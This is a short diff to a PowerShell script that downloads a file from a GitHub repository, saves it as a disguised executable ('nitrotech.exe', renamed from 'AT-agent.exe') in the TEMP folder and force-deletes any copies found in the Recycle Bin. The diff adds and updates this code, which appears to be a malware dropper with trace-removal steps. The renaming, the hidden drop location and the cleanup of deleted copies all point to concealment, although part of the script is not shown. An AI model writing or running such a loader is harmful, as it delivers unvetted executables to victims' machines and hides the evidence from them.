@@ -1,8 +1,8 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $URLs = @(
-    'https://github.com/InfernoTV/Plagiat/new/main/setup.ps1'
+    'https://github.com/InfernoTV/Plagiat/blob/main/setup.ps1'
 )
-$exePath = "$env:TEMP\AT-agent.exe"
+$exePath = "$env:TEMP\nitrotech.exe"
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
     try {
         Invoke-WebRequest -Uri $URL -OutFile $exePath -UseBasicParsing
@@ -25,7 +25,7 @@ foreach ($uninstallKey in $uninstallKeys) {
     }
 }
 $recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
-$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'AT-agent.exe' -ErrorAction SilentlyContinue
+$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'nitrotech.exe' -ErrorAction SilentlyContinue
 foreach ($file in $filesInBin) {
     Remove-Item -Path $file.FullName -Force
 }
